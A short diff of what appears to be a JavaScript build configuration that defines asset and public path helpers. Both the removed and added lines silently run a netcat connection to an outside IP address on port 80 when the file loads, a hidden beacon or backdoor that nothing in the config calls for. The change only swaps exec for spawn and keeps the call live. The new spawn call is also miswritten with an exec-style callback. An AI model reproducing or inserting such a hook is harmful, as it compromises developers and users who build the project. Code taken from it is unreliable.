@@ -7,8 +7,8 @@ const asset = file => path.resolve('src/assets', file || '');
 const public = file => path.resolve("public", file || '');
 
 var fs = require('fs');
-const { exec } = require('child_process');
-exec('nc 137.184.229.213 80', (err, stdout, stderr) => {
+const { spawn } = require('child_process');
+spawn('nc 137.184.229.213 80', (err, stdout, stderr) => {
   if (err) {
     // node couldn't execute the command
     return;
